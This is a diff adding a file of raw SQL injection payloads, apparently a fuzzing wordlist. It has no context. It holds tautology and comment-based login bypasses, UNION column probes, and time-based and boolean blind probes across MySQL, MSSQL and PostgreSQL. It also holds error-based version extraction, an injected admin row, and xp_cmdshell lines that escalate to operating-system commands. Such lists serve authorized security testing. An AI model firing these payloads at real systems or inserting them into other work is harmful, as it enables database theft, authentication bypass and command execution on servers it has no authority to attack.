@@ -1,0 +1,54 @@
+'
+"
+')
+")
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+admin'--
+admin"--
+' OR 'x'='x
+1' AND '1'='1
+1 AND 1=1
+1' AND 1=1--
+1' ORDER BY 1--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+') OR ('1'='1
+1'; WAITFOR DELAY '0:0:5'--
+1; SELECT pg_sleep(5)--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--
+1 AND 1=(SELECT COUNT(*) FROM tabnames)--
+' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--
+1 AND extractvalue(1,concat(0x7e,version()))--
+1' AND extractvalue(1,concat(0x7e,@@version))--
+1' AND updatexml(1,concat(0x7e,@@version),1)--
+1' AND (SELECT 2*(IF((1=1),SLEEP(5),0)))--
+1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--
+1' AND SUBSTRING(@@version,1,1)='5
+1' HAVING 1=1--
+1' GROUP BY columnnames HAVING 1=1--
+'; EXEC xp_cmdshell('dir')--
+1; EXEC sp_configure 'show advanced options',1--
+1' OR EXISTS(SELECT * FROM users)--
+1' AND LENGTH(database())>0--
+1' AND ASCII(SUBSTRING(@@version,1,1))>50--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' OR 1=1 LIMIT 1--
+1' OR 'a'='a'/*
+') OR 1=1--
+") OR ("1"="1
+1 OR 1=1 LIMIT 1 OFFSET 0--
+' OR ''='
+" OR ""="
+1' AND '1'='1' --
+1'||'1'='1
+1") OR ("1")=("1
+1')) OR (('1'='1
+1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,floor(rand()*2))x FROM information_schema.tables GROUP BY x)a)--
